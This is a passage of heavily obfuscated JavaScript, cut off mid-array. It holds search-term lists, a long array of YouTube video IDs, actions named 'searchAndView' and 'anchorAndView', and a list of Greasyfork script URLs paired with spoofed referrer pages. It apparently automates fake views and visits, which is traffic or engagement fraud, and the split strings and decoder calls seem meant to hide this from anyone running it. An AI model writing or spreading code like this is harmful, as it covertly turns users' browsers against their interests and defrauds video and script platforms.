searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + W(0x17) + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x13 * -0xd1 + 0x59 * -0x18 + -0x721)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xc6b + 0x11f8 + -0x1e59)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0xb22 + -0x1 * 0x2303 + -0x22c * -0xb);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    W(0xe) + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    X(0x4, 'b$ea') + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    W(0xa) + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    X(0x0, '5PbO') + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Y(0x9) + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x3, 'jtpo') + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': Y(0x6) + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + X(0x1a, 'bxDx') + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Y(0x7) + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Y(0x16)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + W(0x1b) + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
